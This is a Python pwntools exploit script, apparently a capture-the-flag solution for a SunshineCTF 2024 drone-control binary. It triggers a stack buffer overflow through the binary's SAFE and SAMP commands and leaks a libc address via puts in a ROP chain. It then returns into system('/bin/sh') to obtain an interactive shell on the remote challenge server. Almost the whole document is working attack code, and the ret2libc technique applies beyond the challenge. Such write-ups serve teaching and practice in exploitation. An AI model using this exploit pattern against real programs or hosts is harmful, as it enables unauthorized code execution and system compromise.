#!/usr/bin/env python3

from pwn import *

exe = ELF("./drone.bin_patched")
libc = ELF("./libc6_2.39.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, "break *0x40269A")
    else:
        r = remote("2024.sunshinectf.games", 24004)

    return r


def SAFE(enable: bool):
    r.sendafter(b">>> ", b"SAFE")
    r.sendafter(b">>> ", b"Y" if enable else b"N")


def SAMP(data: bytes):
    r.sendafter(b">>> ", b"SAMP")
    r.sendafter(b">>> ", data)


def RECD(duration: int):
    r.sendafter(b">>> ", b"RECD")
    r.sendafter(b">>> ", str(duration).encode("ascii"))


def ret2deprecated_feedback():
    payload = flat(
                    b"." * 40,
                    0x401dc0,       # `strcpy()` doesn't like NULL chars
                )

    SAMP(payload)


def main():
    r = conn()
    
    pop_rdi = ROP(exe).find_gadget(['pop rdi', 'ret'])[0]

    '''     All the possible commands (all but two are completely useless)
    RECD
    MOVE
    STOP
    TURN
    LIGH
    CAMO
    SIGN
    SENS
    ARMX
    CLAW
    SCAN
    SAMP    <--- if it detects a '.', it strcpy the input over the stack (one return possible)
    TRNS
    BRKS
    DEPL
    SAFE    <--- enables `deprecated_feedback()` (which translates into buffer overflow)
    '''

    SAFE(False)
    ret2deprecated_feedback()

    # Leak libc
    payload = flat(
                    b"A" * 0x108,
                    pop_rdi,
                    exe.got.puts,
                    exe.plt.puts,
                    0x4012fa
                )

    r.sendafter(b">>> ", payload)
    libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - libc.sym.puts
    log.info(f"libc @ 0x{libc.address:x}")

    ret2deprecated_feedback()

    payload = flat(
                    b"A" * 0x108,
                    pop_rdi,
                    next(libc.search(b"/bin/sh\x00")),
                    pop_rdi + 1,        # Dummy return
                    libc.sym.system,
                )

    r.sendafter(b">>> ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
